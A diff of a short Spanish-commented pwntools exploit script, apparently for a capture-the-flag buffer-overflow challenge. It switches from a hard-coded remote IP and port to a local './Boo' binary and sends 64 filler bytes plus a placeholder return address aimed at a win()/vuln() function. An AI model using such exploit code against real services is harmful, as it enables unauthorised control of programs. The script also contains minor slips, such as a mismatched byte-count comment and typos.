@@ -1,15 +1,23 @@
 from pwn import *
 
-# Dirección y puerto a donde te quieres conectar
-ip = '35.188.115.217'  # Cambia esto por tu IP local o la IP donde está el servicio
-port = 65534       # Cambia esto por el puerto corrrecto
+Local = True # Cambia esto a False si vas a explotar el servicio remoto
 
-# Crear la conexión remota al servicio en el puerto 4444
-p = remote(ip, port)
+# Dirección y puerto a donde te quieres conectar
+ip = 'Aqui tu ip'  # Cambia esto por tu IP local o la IP donde está el servicio
+port = 0000       # Cambia esto por el puerto corrrecto
+
+# Crear la conexión local o remota al servicio
+if Local == True:
+    p = process('./Boo')
+else:
+    if Local == False:
+        p = remote(ip, port)
+    else:
+        print("Calmbia Local a True o False")
 
 # Creación del payload
-payload = b'A' * 72  # 40 bytes para llenar el buffer
-payload += p64(0x00000)  # Dirección de la función win() (esto debe ser la dirección correcta en tu binario)
+payload = b'A' * 64  # 64 bytes para llenar el buffer
+payload += p64(0x0000)  # Dirección de la función vuln() (esto debe ser la dirección correcta en tu binario)
 
 # Enviar el payload cuando se recibe el mensaje de "Introduce tu mensaje:"
 p.sendlineafter(b"Introduce tu mensaje:", payload)
